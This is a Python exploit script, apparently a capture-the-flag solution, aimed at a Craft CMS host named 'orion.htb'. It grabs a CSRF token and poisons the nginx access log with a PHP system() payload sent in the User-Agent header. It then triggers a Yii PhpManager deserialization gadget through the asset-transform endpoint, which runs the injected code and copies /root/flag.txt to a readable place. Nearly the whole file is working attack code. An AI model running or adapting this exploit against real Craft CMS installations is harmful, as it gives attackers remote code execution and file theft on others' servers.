#!/usr/bin/env python3
import re
import socket
import sys
import requests
import urllib3

urllib3.disable_warnings()

TARGET_IP = "10.129.244.146"
session = requests.Session()
session.verify = False

_orig = socket.getaddrinfo
def patched(host, *a, **kw):
    if host == "orion.htb": host = TARGET_IP
    return _orig(host, *a, **kw)
socket.getaddrinfo = patched

# Step 1: Get CSRF
r = session.get("http://orion.htb/actions/users/session-info", headers={"Accept": "application/json"})
csrf = r.json()["csrfTokenValue"]
print(f"[+] CSRF: {csrf[:30]}")

# Step 2: Poison with short PHP command (catflag - just write to file)
# Using User-Agent to put PHP code into access.log
php = "<?php @system('cat /root/flag.txt>/tmp/flag');?>"
print(f"[+] Poison UA length: {len(php)}")
r = session.get("http://orion.htb/", headers={"User-Agent": php})
print(f"[+] Poison status: {r.status_code}")

# Step 3: Trigger PhpManager gadget
data = {
    "CRAFT_CSRF_TOKEN": csrf,
    "assetId": "2",
    "handle[width]": "1",
    "handle[height]": "1",
    "handle[as x][class]": "craft\\behaviors\\FieldLayoutBehavior",
    "handle[as x][__class]": "yii\\rbac\\PhpManager",
    "handle[as x][itemFile]": "/var/log/nginx/access.log",
}

r = session.post("http://orion.htb/actions/assets/generate-transform", data=data)
print(f"[+] Trigger status: {r.status_code}")

# Step 4: Try to read /tmp/flag
import time
time.sleep(1)
r = session.get("http://orion.htb/tmp/flag")
print(f"[+] Read /tmp/flag: {r.status_code}")
print(r.text[:500])
